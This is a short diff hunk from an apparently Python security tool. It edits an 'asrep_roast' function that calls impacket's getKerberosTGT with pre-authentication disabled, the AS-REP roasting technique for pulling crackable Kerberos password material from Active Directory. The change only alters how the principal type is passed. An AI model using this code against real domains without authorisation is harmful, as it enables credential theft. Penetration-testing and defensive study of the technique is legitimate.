@@ -22,7 +22,7 @@ def asrep_roast(target_host: str, domain: str, username: str = "") -> dict:
     from impacket.krb5.kerberosv5 import getKerberosTGT
     from impacket.krb5.types import Principal
 
-    client_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    client_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL)
     as_rep_bytes, _cipher, _key, _session_key = getKerberosTGT(
         client_principal, "", domain, "", "", "", target_host, kerberoast_no_preauth=True
     )
